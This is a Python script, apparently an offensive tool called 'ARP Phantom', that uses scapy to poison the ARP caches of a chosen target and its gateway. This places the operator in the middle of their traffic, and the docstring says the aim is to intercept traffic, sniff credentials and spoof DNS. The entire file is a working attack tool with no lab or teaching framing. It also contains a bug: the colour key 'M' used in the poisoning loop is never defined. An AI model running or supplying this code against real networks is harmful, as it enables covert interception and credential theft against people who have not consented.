#!/usr/bin/env python3
"""
SHADOWCYPHER // ARP PHANTOM — ARP Cache Poisoning & MITM Engine
Performs ARP spoofing to position operator between target and gateway.
Enables traffic interception, credential sniffing, and DNS spoofing.
Requires root and scapy.

Usage:
    sudo python3 arp_phantom.py -t TARGET_IP -g GATEWAY_IP [-i INTERFACE] [--forward]
"""

import argparse, os, sys, time, signal, threading

C = {"R":"\033[1;31m","G":"\033[1;32m","Y":"\033[1;33m","C":"\033[1;36m","N":"\033[0m","B":"\033[1m"}

def check_root():
    if os.geteuid() != 0:
        print(f"{C['R']}[ERROR]{C['N']} ARP Phantom requires root. Run with sudo.")
        sys.exit(1)

def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print(f"  {C['G']}[+]{C['N']} IP forwarding enabled")

def disable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print(f"  {C['Y']}[*]{C['N']} IP forwarding disabled")

def get_mac(ip, iface=None):
    """Resolve IP to MAC via ARP request using scapy."""
    from scapy.all import ARP, Ether, srp
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    kwargs = {"timeout": 3, "verbose": False}
    if iface:
        kwargs["iface"] = iface
    result, _ = srp(pkt, **kwargs)
    if result:
        return result[0][1].hwsrc
    return None

def poison(target_ip, target_mac, spoof_ip, iface=None):
    """Send a single ARP reply to poison target's cache."""
    from scapy.all import ARP, Ether, sendp
    pkt = Ether(dst=target_mac) / ARP(
        op=2,         # is-at (reply)
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # claim to be the gateway
    )
    kwargs = {"verbose": False}
    if iface:
        kwargs["iface"] = iface
    sendp(pkt, **kwargs)

def restore(target_ip, target_mac, real_ip, real_mac, iface=None):
    """Restore the original ARP mapping."""
    from scapy.all import ARP, Ether, sendp
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac
    )
    kwargs = {"verbose": False, "count": 5}
    if iface:
        kwargs["iface"] = iface
    sendp(pkt, **kwargs)

def main():
    check_root()

    p = argparse.ArgumentParser(description="ShadowCypher ARP Phantom — MITM Engine")
    p.add_argument("-t", "--target", required=True, help="Target IP to poison")
    p.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    p.add_argument("-i", "--interface", default=None, help="Network interface")
    p.add_argument("--forward", action="store_true", help="Enable IP forwarding for MITM")
    p.add_argument("--interval", type=float, default=2.0, help="Poison interval (seconds)")
    a = p.parse_args()

    print(f"\n{C['B']}{'='*70}{C['N']}")
    print(f" {C['C']}SHADOWCYPHER // ARP PHANTOM{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}")
    print(f"  Target:  {C['Y']}{a.target}{C['N']}")
    print(f"  Gateway: {C['Y']}{a.gateway}{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}\n")

    # Resolve MACs
    print(f"  {C['C']}[*]{C['N']} Resolving target MAC...")
    target_mac = get_mac(a.target, a.interface)
    if not target_mac:
        print(f"  {C['R']}[-]{C['N']} Could not resolve target MAC. Is {a.target} online?")
        sys.exit(1)
    print(f"  {C['G']}[+]{C['N']} Target MAC: {C['Y']}{target_mac}{C['N']}")

    print(f"  {C['C']}[*]{C['N']} Resolving gateway MAC...")
    gateway_mac = get_mac(a.gateway, a.interface)
    if not gateway_mac:
        print(f"  {C['R']}[-]{C['N']} Could not resolve gateway MAC. Is {a.gateway} reachable?")
        sys.exit(1)
    print(f"  {C['G']}[+]{C['N']} Gateway MAC: {C['Y']}{gateway_mac}{C['N']}")

    if a.forward:
        enable_ip_forward()

    print(f"\n  {C['G']}[+]{C['N']} ARP poisoning started. Press Ctrl+C to stop.\n")

    packets_sent = 0
    running = True

    def signal_handler(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, signal_handler)

    try:
        while running:
            # Poison target: tell target we are the gateway
            poison(a.target, target_mac, a.gateway, a.interface)
            # Poison gateway: tell gateway we are the target
            poison(a.gateway, gateway_mac, a.target, a.interface)
            packets_sent += 2

            sys.stdout.write(f"\r  {C['M']}[POISONING]{C['N']} Packets sent: {packets_sent}")
            sys.stdout.flush()
            time.sleep(a.interval)
    except Exception as e:
        print(f"\n  {C['R']}[-]{C['N']} Error: {e}")

    # Restore
    print(f"\n\n  {C['Y']}[*]{C['N']} Restoring ARP tables...")
    restore(a.target, target_mac, a.gateway, gateway_mac, a.interface)
    restore(a.gateway, gateway_mac, a.target, target_mac, a.interface)

    if a.forward:
        disable_ip_forward()

    print(f"  {C['G']}[+]{C['N']} ARP tables restored. Clean exit.")

if __name__ == "__main__":
    main()
